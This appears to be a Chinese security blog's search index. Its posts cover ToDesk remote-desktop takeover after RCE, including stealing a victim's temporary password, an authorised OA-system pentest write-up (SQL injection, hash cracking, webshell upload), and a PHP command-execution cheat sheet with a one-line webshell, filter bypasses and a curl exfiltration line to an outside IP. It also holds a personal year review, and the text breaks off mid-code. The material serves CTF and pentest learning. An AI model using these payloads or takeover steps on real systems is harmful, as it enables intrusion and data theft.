<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>cmd下写如何写入webshell</title>
    <link href="/2022/07/25/cmd%E4%B8%8B%E5%86%99%E5%A6%82%E4%BD%95%E5%86%99%E5%85%A5webshell/"/>
    <url>/2022/07/25/cmd%E4%B8%8B%E5%86%99%E5%A6%82%E4%BD%95%E5%86%99%E5%85%A5webshell/</url>
    
    <content type="html"><![CDATA[<blockquote><p>在渗透测试中常常会遇到这样的问题：通过某某组件的nday获取到了一个windos的非交互式cmd权限(Linux通常可以直接反弹shell)，然后继续想往后渗透的时候就得上传webshell来方便我们进行后渗透，想写cmd文件却发现很费劲，这次就来总结下如何去写入cmd文件。</p></blockquote><p>以冰蝎自带的jsp马为例</p><h1 id="1、直接去写"><a href="#1、直接去写" class="headerlink" title="1、直接去写"></a>1、直接去写</h1><p>linux下自然是可以使用echo “xxxxxxxxx” &gt;1.php，但是windows的话是不可以直接这样写的</p><h1 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h1>]]></content>
    
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>安全研究</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从RCE到桌面登入</title>
    <link href="/2022/07/23/%E4%BB%8ERCE%E5%88%B0%E6%A1%8C%E9%9D%A2%E7%99%BB%E5%85%A5/"/>
    <url>/2022/07/23/%E4%BB%8ERCE%E5%88%B0%E6%A1%8C%E9%9D%A2%E7%99%BB%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<blockquote><p>在攻防演练中，Windows主机RCE之后应该去做什么？自然是上传C2去用命令行进行后渗透，但我就是想玩一下，想要去远控桌面，进行一些操作，该怎么办？</p></blockquote><p>这是真实渗透测试中的一个场景，我拿到了一个System权限的Webshell，可以上传文件，我成功上线CS，我想用cs自带的远控去操控机器玩下，却发现打开一直在黑屏，对面服务器部署在云上，云防火墙上3389端口也没有开，那么我们该如何去进行远程桌面控制呢？</p><p>由于云服务已关，使用本地环境进行复现。</p><p>首先要保证对面是出网的，这就需要用到一个远控桌面神器Todesk了，把安装包上传到云服务器上，进行静默安装，安装时候最好把Todesk名字改的比较简单，输入命令</p><p><img src="/2022/07/23/%E4%BB%8ERCE%E5%88%B0%E6%A1%8C%E9%9D%A2%E7%99%BB%E5%85%A5/image-20220723205825616.png" alt="image-20220723205825616"></p><p><img src="/2022/07/23/%E4%BB%8ERCE%E5%88%B0%E6%A1%8C%E9%9D%A2%E7%99%BB%E5%85%A5/image-20220723210006321-16586227275881.png" alt="image-20220723210006321"></p><p>发现已经安装完毕了，但是此时我们是看不到屏幕的，该如何下一步操作呢？</p><h1 id="方法1、更改密码"><a href="#方法1、更改密码" class="headerlink" title="方法1、更改密码"></a>方法1、更改密码</h1><p>我们要了解一个知识点，就是Todesk也是支持命令行操作的(应该是方便运维操作)，那么我们就可以利用命令行去更改todesk的临时密码，以及显示出设备代码等信息，官方文档给了几个命令</p><figure class="highlight cmd"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><pre><code class="hljs cmd">ToDesk.exe -<span class="hljs-built_in">help</span><br>ToDesk.exe -<span class="hljs-built_in">help</span> -control<br>当前版本号:<br>ToDesk.exe -version<br>当前运行状态:<br>ToDesk.exe -status<br>获取设备代码:<br>ToDesk.exe -getid<br>设置安全密码:<br>ToDesk.exe -setpasswd password<br>设置开机启动:<br>ToDesk.exe -autostart on/off<br>登陆账户并保存:<br>ToDesk.exe -user aaaa@aaaa -passwd <span class="hljs-number">123456</span><br>退出当前登录账号:<br>ToDesk.exe -signout<br>发起控制:<br>ToDesk.exe -control -id <span class="hljs-number">123456789</span> -passwd <span class="hljs-number">123456</span>(仅支持设备列表里已解锁设备发起控制)<br>设置代理并启用:<br>ToDesk.exe -setproxy -proxyip <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span> -port <span class="hljs-number">8080</span> (没有账号密码可不用输入后面的参数) -proxyuser admin -proxypasswd <span class="hljs-number">123456</span><br>启用/禁用代理上网:<br>ToDesk.exe -proxy on/off<br>退出运行:<br>ToDesk.exe -<span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p>这里存在坑点，就是我们不能直接去执行，直接执行是什么勾八都输出不了的，最开始我以为是冰蝎cmd的问题，后来发现直接用命令行去输出也是有问题的，需要用官方给的实例</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic">@echo <span class="hljs-keyword">off</span><br><span class="hljs-keyword">for</span> /f <span class="hljs-string">&quot;delims=&quot;</span> %%i in (<span class="hljs-comment">&#x27;&quot;C:\Program Files (x86)\ToDesk\ToDesk.exe&quot; -status&#x27;) do echo %%i</span><br>pause<br></code></pre></td></tr></table></figure><p><img src="/2022/07/23/%E4%BB%8ERCE%E5%88%B0%E6%A1%8C%E9%9D%A2%E7%99%BB%E5%85%A5/image-20220723210910769-16586227342183.png" alt="image-20220723210910769"></p><p>所以咱们就设定自己的脚本，</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic">@echo <span class="hljs-keyword">off</span><br><span class="hljs-keyword">for</span> /f <span class="hljs-string">&quot;delims=&quot;</span> %%i in (<span class="hljs-comment">&#x27;&quot;C:\Program Files (x86)\ToDesk\ToDesk.exe&quot; -setpasswd 123315&#x27;) do echo %%i</span><br><span class="hljs-keyword">for</span> /f <span class="hljs-string">&quot;delims=&quot;</span> %%i in (<span class="hljs-comment">&#x27;&quot;C:\Program Files (x86)\ToDesk\ToDesk.exe&quot; -status&#x27;) do echo %%i</span><br>pause<br></code></pre></td></tr></table></figure><p><img src="/2022/07/23/%E4%BB%8ERCE%E5%88%B0%E6%A1%8C%E9%9D%A2%E7%99%BB%E5%85%A5/image-20220723211043747-16586227362005.png" alt="image-20220723211043747"></p><p>我们可以看到已经返回了Success已经设备id了，我们用todesk连接下试试</p><p><img src="/2022/07/23/%E4%BB%8ERCE%E5%88%B0%E6%A1%8C%E9%9D%A2%E7%99%BB%E5%85%A5/image-20220723211145478-16586227389347.png" alt="image-20220723211145478"></p><p>发现成功连上。</p><h1 id="方法2、获取临时密码"><a href="#方法2、获取临时密码" class="headerlink" title="方法2、获取临时密码"></a>方法2、获取临时密码</h1><p>我们知道Todesk是会有临时密码的，那么我们是不是也可以通过获取临时密码来远控该设备，</p><p>那么这又是另外一个场景，而且是比第一个场景更加实用，假设我们获取到了一个低权限的webshell，无法去通过一些手段去提权，这时候我们tasklist了一下，刚好发现有todesk在运行，那么该如何去利用呢？</p><p><img src="/2022/07/23/%E4%BB%8ERCE%E5%88%B0%E6%A1%8C%E9%9D%A2%E7%99%BB%E5%85%A5/image-20220723211824294-16586227445179.png" alt="image-20220723211824294"></p><p>Todesk的密码其实保存在安装目录下的config.ini文件里，但是密码是加密的，我们也不知道算法，如何去解密呢？其实方法很简单，我们不需要去自己手动解密，只需要todesk自己帮我们解密就行了</p><p><img src="/2022/07/23/%E4%BB%8ERCE%E5%88%B0%E6%A1%8C%E9%9D%A2%E7%99%BB%E5%85%A5/image-20220723212130879-165862274712811.png" alt="image-20220723212130879"></p><p><img src="/2022/07/23/%E4%BB%8ERCE%E5%88%B0%E6%A1%8C%E9%9D%A2%E7%99%BB%E5%85%A5/image-20220723212212269-165862274964213.png" alt="image-20220723212212269"></p><p>可以看到目前宿主机的密码是648281，受害机的是361148，但是我们并不知道受害机的密码，我们直接可以copy配置文件到宿主机的目录下，然后我们重启一下宿主机的Todesk</p><p><img src="/2022/07/23/%E4%BB%8ERCE%E5%88%B0%E6%A1%8C%E9%9D%A2%E7%99%BB%E5%85%A5/image-20220723212412876-165862275165715.png" alt="image-20220723212412876"></p><p>神奇的事情发生了，宿主机的密码就是361148，我们可以直接利用该密码去远程连接受害机了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>安全研究</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>摘抄</title>
    <link href="/2022/06/11/%E6%91%98%E6%8A%84/"/>
    <url>/2022/06/11/%E6%91%98%E6%8A%84/</url>
    
    <content type="html"><![CDATA[<p>他放下酒碗，拿起双筷子，以竹筷击酒瓮，放声而歌：“喝不完的杯中酒，唱不完的离别歌，放不下的宝刀，上不得的高楼，流不尽的英雄血，杀不完的仇人头”。</p><p>话已经说完了，只有那一句？杨凡仿佛在沉思，过了很久，才缓缓道:“有时一句话，就已胜过千言万语！”</p>]]></content>
    
    
    
    <tags>
      
      <tag>摘抄</tag>
      
      <tag>偶有所得</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次曲折的渗透测试</title>
    <link href="/2022/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <url>/2022/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本次渗透测试为授权测试，信息皆做脱敏处理</p></blockquote><h1 id="启"><a href="#启" class="headerlink" title="启"></a>启</h1><p>拿到网站，其中一个资产为该单位办公系统，看到界面比较老，感觉有戏，</p><p>所用系统为九思oa，先去搜一下已公开的poc看看能不能去打</p><p><img src="/2022/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220601201826085.png" alt="image-20220601201826085"></p><p><img src="/2022/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220601201838486.png" alt="image-20220601201838486"></p><p>搜到了两个，尝试无果，就把所有资产都丢进awvs里扫一下，抱着试一试的心态去看看能不能扫出东西来</p><p><img src="/2022/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220601202119547.png" alt="image-20220601202119547"></p><p>发现此处存在sql注入，可执行sleep语句，就去抓个包，尝试用sqlmap一把梭</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">python sqlmap.py -r 1.txt --dbs<br></code></pre></td></tr></table></figure><p>发现跑不出来，想找原因，就去手工测试了一下</p><p><img src="/2022/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220601202838143.png" alt="image-20220601202838143"></p><p>在输入admin的时候提示是该用户没有维护邮箱，但是应该存在该用户</p><p><img src="/2022/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220601202936200.png" alt="image-20220601202936200"></p><p>加’发现报错提示没有该用户信息</p><p><img src="/2022/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220601203220876.png" alt="image-20220601203220876"></p><p>加了#号之后和单独输入admin一样，那就证明其存在sql注入，通过fuzzy，发现其过滤了空格。</p><p>尝试用sqlmap的temper脚本去绕过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python sqlmap.py -r 1.txt --tamper=space2comment -dbs<br></code></pre></td></tr></table></figure><p>果然成功了</p><p><img src="/2022/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220601204755423.png" alt="image-20220601204755423"></p><h1 id="承"><a href="#承" class="headerlink" title="承"></a>承</h1><p>想要通过sql注入注出账号密码</p><p><img src="/2022/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220601205449309.png" alt="image-20220601205449309"></p><p>jsdb的md5解密后为12345678</p><p>root的md5解密后为jiusi<img src="/2022/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220601205558917.png" alt="image-20220601205558917"></p><p>用御剑扫描其端口发现其数据库端口并未开放，只能作罢，去寻找其他思路<img src="/2022/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220601205837781.png" alt="image-20220601205837781"></p><p>尝试去写一个webshell进去，发现也失败了，权限不够，而且不知道绝对路径</p><p>那就尝试去注出网站的账号密码，登入试试看看能不能getshell。</p><p>此时问题又来了，我们不知道账号密码在那个表里，而且由于是盲注，速度比较慢，一个oa里有几百张表，一个表里有几十个字段，也来不及一个一个试，此时又陷入了僵局。</p><h1 id="转"><a href="#转" class="headerlink" title="转"></a>转</h1><p>我们继续去扫描该单位站点，发现该单位还有一测试的九思oa站点，且端口开放为3306，猜想之前注出的数据库密码jiusi为该数据库的密码，直接用Navicat去连接，</p><p>发现其表的结构如下<img src="/2022/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220604204710499.png" alt="image-20220604204710499"></p><p>有几百张表(幸亏没跑盲注)，通过该表的结构，去构造相应的sql语句(利用sqlmap的sql-shell来执行)，成功把管理员以及其他用户的账号密码注了出来，数据库的密码并非用明文储存，</p><p><img src="/2022/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220604205152908.png" alt="image-20220604205152908"></p><p>注出一串39位的字符，并非md5，通过对前端代码进行分析，发现其先进行了md5加密，然后交给后端处理，一定是后端又进行了加密，在网上搜到了该oa的部分源码，对其加密算法进行逆向，得出如下结果，需要舍弃固定位数，再对字符串进行重拼，即可得到相应的md5值，然后尝试去md5解密，可惜的是没把管理员的md5给破解出来，破解出来了一些普通用户的密码，然后登入。</p><p><img src="/2022/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220604205334611.png" alt="image-20220604205334611"></p><h1 id="合"><a href="#合" class="headerlink" title="合"></a>合</h1><p>进入oa，看看有没有上传点，尝试上传，发现其过滤了.jsp文件后缀，且为白名单上传，尝试了几个姿势，无法绕过。</p><p>通过指纹识别发现其利用了eweditor组件，尝试用默认密码登入，发现可以进去，把图片类型给加一个jsp，尝试上传</p><p><img src="/2022/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220604205741782.png" alt="image-20220604205741782"></p><p>上传成功</p><p><img src="/2022/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220604210209773.png" alt="image-20220604210209773"></p><p><img src="/2022/06/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220604210430090.png" alt="image-20220604210430090"></p><p>成功rce，接下来就传个好用点的马去内网漫游</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>安全研究</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>给2021来段总结</title>
    <link href="/2022/01/02/%E7%BB%992021%E6%9D%A5%E6%AE%B5%E6%80%BB%E7%BB%93/"/>
    <url>/2022/01/02/%E7%BB%992021%E6%9D%A5%E6%AE%B5%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<blockquote><p>​        这不是篇关于技术的文章，现在是2022年1月2日21:50分，我听着Eason的歌在复习HTML，看到一则朋友圈，突然想给自己的2021一个总结，立一个Flag吧，每年年初都给自己上一年写篇总结，只是想把得失记录下来，让以后回忆时有个依靠，把心中的遗憾写下来，惊醒以后的自己，也算是倾泻我的表达欲。</p></blockquote><p>​            2021，应该是我自出生以来经历事情最多的一年了，我一时之间竟不知从何说起，写作总得有个大纲吧，虽然是即兴而坐，但也要有逻辑，那我就先吹一吹牛逼，看一下这年取得的成就把。</p><p>​            这一年，成就大多都与网络空间安全有关，第一份成就应该在五月份，五月份，我们队伍打进了全国大学生信息安全竞赛华南赛区复赛，这也是我准备第一次去参加线下的比赛了，比赛地点是在广州中山大学，我当时特别激动，因为没去过广州，高一的梦想其实就是考进中山大学，但是直到高四也没有实现。很可惜，比赛时正值广州疫情爆发，比赛给取消了。本来说是AWD，但是以线上CTF赛的形式比了，我也第一次在大型CTF比赛中做出了一道WEB题，非常激动，可惜海大这次没有打入全国总决赛，非常遗憾。</p><p>​        日子过的可真快呀，第二份成就应该是10月份拿的了，在海南省网络攻防大赛上拿到了一等奖，这在我预料之中，但是第一名被其他学校给拿走了，虽然是主办方出题有一定问题(没有PWN和WEB，13道MISC),我们的PWN大师傅没发挥出水平，但是也暴露了我们队伍中的一些问题，没有密码手，比赛前练习强度不够，以后比赛前应该把MISC和密码学类的题多练练，才能稳坐钓鱼台。</p><p>​        在10月份，我参加了全国教育系统攻防演练，这是我第一次参加HW行动，作为红队，第一次对这么大型的系统进行测试，也学习到了许多攻击的方法，但是还是太菜，没有打出什么成果，但是收到了劳务费4620元，这也算是我的第一桶金了，虽然不多，但还是让我很激动。在11月份，我们参加了广交会的HW行动，成功挖掘到了两个低危漏洞，还获得了方滨兴院士签名的证书，再次很激动，本来以为没有奖金，但是前天中午突然来了960元奖金，给我高兴坏了。还是在11月份，我们参加了长安杯电子取证大赛，这是我第一次参加除CTF，渗透测试之外的比赛，没什么经验，啥都不会做，被于大佬带飞，拿了一个三等奖。还是在11月份，我们成为了信息化服务中心的编外人员，每月提交两次报告，工资是600元/月，聊胜于无，我们对学校资产进行扫描，也发现了许多或历史遗留，或新上线的平台出现的一些比较危险的漏洞，并提交给了信息化服务中心，也算用自己所学为学校的建设出了一份力。还是11月份，网安协会同研究生学会联合举办了”网安杯网络空间安全知识竞答大赛”，我作为这次活动的总负责人，也学到了非常多的东西，从策划案的编写，奖品购买，人员统筹，比赛细节的具体探讨，真的是让我获益良多。</p><p>​        12月份并没有参加什么比赛，而是在忙着复习期末考试，这期间我报名了冬奥卫士，应该是HW的蓝队，审核结果到我写这篇文章的时候还没有出来，不知道到时候能不能相约北京了。</p><p>​        技术方面虽然可能在学校中已经算可以了，但是我清楚地知道自己的实力，和其他学校的同学比起来还是有较大的差距，学东西也是在囫囵吞枣，对一些细节上或是底层上的东西并没有进行深入的研究。</p><p>​        经过了这半年，我对于未来的规划发生了一些改变，原来是想在本科阶段学好技术然后直接去大厂工作，工作几年赚够钱便去老家开个饭店，然后悠闲地过日子。但是现在想法发生了改变，做大厂的打工人并不能让我安身立命，我并不想在毕业之后去做所谓的安服仔，况且我想对网络空间安全这方面进行深入的研究，做出一些真正能够提升企业乃至国家安全防护水平的东西，所以就必须去读硕、读博，去静下心深入地研究，未来的路才会走的长远。</p><p>​        学习之外，还有生活，由于疫情影响和资金不足，我今年没有怎么去旅游，仅仅是在海口周边逛了逛，去了海南热带野生动植物园，通过一车窗之隔看了许多凶猛的野生动物，更重要的是见到了心心念念的国宝。2021-2022跨年夜，我去听了纪念Beyond的跨年演唱会，伴随着光辉岁月迎来了2022，富九唱的确实和家驹很像，特别是颤音，简直一摸一样了。但是我听着却少了一些东西，我回来之后细细品味，发现正因为是和平常听到的Beyond的版本太像了，就好像拿一个大型音响在播放一样，反倒是失去了灵魂，之前看郝云演出，他们都会对歌曲做出一些改编，让其更适合现场的氛围，而不是就像在放录音室版本的歌曲一样。</p><p>​        这一年，我还是没有静下心，学东西还是带着浮躁，急于求成的心里，希望在2022年，我能够静下心来，以我高四规格严格，功夫到家的态度去对待计算机学习，这样才能让我的路走的更长远，否则只是一个脚本小子罢了。</p><p>​        克己复礼为仁。一日克己复礼，天下归仁焉。为仁由己，而由人乎哉？</p><div class="code-wrapper"><pre><code class="hljs">     Hack forever</code></pre></div><p>​    </p>]]></content>
    
    
    
    <tags>
      
      <tag>杂文</tag>
      
      <tag>生活感悟</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP命令执行最全面的总结</title>
    <link href="/2021/12/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%9C%80%E5%85%A8%E9%9D%A2%E7%9A%84%E6%80%BB%E7%BB%93/"/>
    <url>/2021/12/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%9C%80%E5%85%A8%E9%9D%A2%E7%9A%84%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<blockquote><p>总结一下PHP中命令执行的方法，把知识点汇成一个体系，Work hard！</p></blockquote><h1 id="什么是命令执行漏洞？"><a href="#什么是命令执行漏洞？" class="headerlink" title="什么是命令执行漏洞？"></a>什么是命令执行漏洞？</h1><p>以php为例，产生该漏洞的原因就是系统在某个点调用了可以执行命令的函数，如eval，system,特殊(include)等，这些函数的参数用户可控，进而黑客可以执行一些对系统有威胁的命令，如获取敏感文件、删除信息等，进而危害到系统。其他语言如java、python也是如此。</p><p>在CTF比赛中，命令执行一直作为一个常见的考点，初学者应牢牢掌握此考点。</p><h1 id="初识命令执行"><a href="#初识命令执行" class="headerlink" title="初识命令执行"></a>初识命令执行</h1><h2 id="从一句话木马开始"><a href="#从一句话木马开始" class="headerlink" title="从一句话木马开始"></a>从一句话木马开始</h2><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>初学者一般会看到这个函数，最开始对代码没有了解的情况下，直接去看wp，会告诉你用蚁剑或者菜刀连接，连上之后我们会发现直接可以查看服务器上的所有文件了，那么这种究竟是什么原理呢? </p><p>eval，即执行命令的函数，(在php中与之相近的有assert，这个之后进行总结)可以执行POST传入的东西，而$_POST为一个数组，类似于python中的字典，java中的map，其中储存的是键名和键值，在php环境中，可以直接传参，然后数据就会被储存进该数组中，在上面代码中仅仅是把键名为a的值取出来执行而已。</p><p>而我们常用的蚁剑，菜刀等工具，就是通过给$_POST数组中的数据传输他们已经写好的命令，然后根据所返回的值，去模拟终端，模拟文件管理器。</p><h2 id="我们如何利用命令执行"><a href="#我们如何利用命令执行" class="headerlink" title="我们如何利用命令执行"></a>我们如何利用命令执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>通常来说，我们如果看到上述命令就可以直接去利用，可以用蚁剑菜刀连接，但是这是个人都能做，出题人不会这么直接给你送分，所以一般要整些活，那么都会整什么活呢？</p><p>一般来说，出题者让我们执行的命令通常有两种，一种是系统命令，一种是php的命令，而系统命会包含在php命令里，因为系统命令的执行也是通过调用php函数system等来执行的。</p><h3 id="常见的系统命令执行函数绕过"><a href="#常见的系统命令执行函数绕过" class="headerlink" title="常见的系统命令执行函数绕过"></a>常见的系统命令执行函数绕过</h3><p>最开始通常会过滤一些linux命令，如cat，等等，这时候就需要我们用一些小技巧去绕过了，如命令代替，LInux下通配符的使用</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cat</span> 替代品 tac tail <span class="hljs-keyword">nl</span> less <span class="hljs-keyword">more</span>  <span class="hljs-keyword">ca</span>\t  (用反斜杠去截断过滤 ) <span class="hljs-keyword">ca</span>&#x27;&#x27;t（用双引号截断过滤）<br><br>空格 替代品 &lt; <span class="hljs-variable">$&#123;IFS&#125;</span> <span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span> %09 %0a<br>linux下空格绕过<br>&#123;<span class="hljs-keyword">cat</span>,flag.txt&#125; <br><span class="hljs-keyword">cat</span><span class="hljs-variable">$&#123;IFS&#125;</span>flag.txt<br><span class="hljs-keyword">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9flag</span>.txt<br><span class="hljs-keyword">cat</span>&lt;flag.txt<br><span class="hljs-keyword">cat</span>&lt;&gt;flag.txt<br>kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;<span class="hljs-keyword">cat</span><span class="hljs-variable">$kg</span><br><span class="hljs-keyword">cat</span>%09flag.php<br><br><span class="hljs-keyword">cat</span> `<span class="hljs-keyword">ls</span>`  <br><br>cp fla?.php 1.txt访问1.txt <br><br>利用变量绕过a=<span class="hljs-keyword">l</span>;b=s;<span class="hljs-variable">$a</span><span class="hljs-variable">$b</span><br></code></pre></td></tr></table></figure><p>用curl外带flag</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">nc -lnvp <span class="hljs-number">7499</span><br>curl -F <span class="hljs-string">&quot;XX=@flag.php&quot;</span> -X POST  http:<span class="hljs-regexp">//</span><span class="hljs-number">119.91</span>.<span class="hljs-number">92.171</span>:<span class="hljs-number">7499</span><br>适用于无回显时执行命令 如shell_exec 等<br></code></pre></td></tr></table></figure><p>利用环境变量拼接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash">&#123;PATH:5:1&#125;<span class="hljs-variable">$&#123;PATH:2:1&#125;</span></span><br></code></pre></td></tr></table></figure><p><img src="/2021/12/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%9C%80%E5%85%A8%E9%9D%A2%E7%9A%84%E6%80%BB%E7%BB%93/image-20211210101111929.png" alt="image-20211210101111929"></p><h3 id="常见的php命令执行绕过"><a href="#常见的php命令执行绕过" class="headerlink" title="常见的php命令执行绕过"></a>常见的php命令执行绕过</h3><p>首先看到一个eval函数肯定是要想执行系统命令的，php所有可以用来执行系统命令的函数如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">system() <br>shell_exec()<br>exec()<br>passthru()<br>popen()<br>形式上还有 `cmd`  (即利用反引号执行命令) <br>值得注意的是除了system和passthru没有返回值，即执行命令后的结果不会出现，这时候就需要用到之前讲绕过时候说的利用curl去外带flag<br><br></code></pre></td></tr></table></figure><p>php命令执行通常有两种过滤</p><h4 id="方式一，用正则表达式进行过滤"><a href="#方式一，用正则表达式进行过滤" class="headerlink" title="方式一，用正则表达式进行过滤"></a>方式一，用正则表达式进行过滤</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">案例一(非常经典)<br>无字符数字Rce<br> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span>(preg_match(<span 